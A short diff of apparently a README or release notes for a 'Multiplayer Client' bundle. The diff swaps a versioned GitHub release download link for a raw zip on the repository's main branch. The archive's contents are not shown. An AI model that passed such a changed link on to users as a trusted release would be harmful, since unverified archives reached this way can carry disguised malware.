@@ -10,4 +10,4 @@
 
 - the Moquil app 1.4 is now included inside the full zip (server roles, channels, moderation, polls and the Discord-style avatar decorations)
 
-[Multiplayer Client FULL 4.13.20](https://github.com/ThirtyFoxMCx00E1/wagu/releases/download/v4.13.20/MP-4.13.20-full.zip)
+[Multiplayer Client FULL 4.13.20](https://github.com/ThirtyFoxMCx00E1/wagu/raw/main/assets/MP/MP.zip)
